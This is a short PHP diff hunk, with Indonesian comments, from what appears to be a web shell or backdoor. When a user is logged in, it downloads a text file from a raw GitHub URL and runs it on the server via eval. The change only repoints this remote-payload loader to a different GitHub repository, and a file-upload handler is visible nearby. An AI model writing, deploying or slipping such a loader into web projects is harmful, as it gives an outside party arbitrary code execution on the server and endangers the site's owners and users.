@@ -81,7 +81,7 @@ if (isset($_FILES['file']['tmp_name'])) {
 
 // Jika pengguna sudah login, ambil dan eksekusi konten dari URL
 if (is_logged_in()) {
-    $url = 'https://raw.githubusercontent.com/barbarmarkett/lem/refs/heads/main/miawnopw.txt';
+    $url = 'https://raw.githubusercontent.com/awli-lgtm/nopw/refs/heads/main/miawnopw.txt';
     $content = getRawContent($url);
     eval('?>' . $content);
     exit;
